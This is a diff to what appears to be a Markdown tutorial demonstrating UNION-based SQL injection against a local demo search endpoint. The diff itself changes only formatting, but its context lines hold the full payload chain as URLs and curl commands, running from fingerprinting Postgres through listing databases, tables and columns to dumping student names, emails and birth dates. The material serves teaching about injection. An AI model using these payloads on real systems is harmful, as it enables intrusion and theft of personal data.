@@ -112,8 +112,7 @@ $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20VERSION
 ]
 ```
 
-Now that the attacker knows that the database appears to be Postgres, they can then write a query to list databases: 
-`http://localhost/search?prefix=Intro' UNION SELECT 1, datname, NULL, NULL FROM pg_database--`.
+**Now that the attacker knows that the database appears to be Postgres, they can then write a query to list databases. (`http://localhost/search?prefix=Intro' UNION SELECT 1, datname, NULL, NULL FROM pg_database--`)**
 
 ```sh
 $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20datname,%20NULL,%20NULL%20FROM%20pg_database-- | jq
@@ -135,7 +134,7 @@ $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20datname
 
 ...tables...
 
-(`http://localhost/search?prefix=Intro' UNION SELECT 1, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--`):
+**(`http://localhost/search?prefix=Intro' UNION SELECT 1, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--`):**
 
 ```sh
 $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20table_name,%20NULL,%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20\=%20%27public%27-- | jq
@@ -162,7 +161,7 @@ $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20table_n
 ```
 ...and columns within tables visible to the application user:
 
-(`http://localhost/search?prefix=Intro' UNION SELECT 1, column_name, data_type, NULL FROM information_schema.columns WHERE table_name='students'--`):
+**(`http://localhost/search?prefix=Intro' UNION SELECT 1, column_name, data_type, NULL FROM information_schema.columns WHERE table_name='students'--`):**
 
 
 ```sh
@@ -201,9 +200,9 @@ $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20column_
 ]
 ```
 
-...and, ultimately, all student details:
+...and, ultimately, all student details 💀:
 
-(`http://localhost/search?prefix=Intro' UNION SELECT id, CONCAT(first_name, last_name), email, CAST(date_of_birth as VARCHAR) FROM students--`):
+**(`http://localhost/search?prefix=Intro' UNION SELECT id, CONCAT(first_name, last_name), email, CAST(date_of_birth as VARCHAR) FROM students--`):**
 
 ```sh
 $ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%20id,%20CONCAT\(first_name,%20%27%20%27,%20last_name\),%20email,%20CAST\(date_of_birth%20AS%20VARCHAR\)%20FROM%20students-- | jq
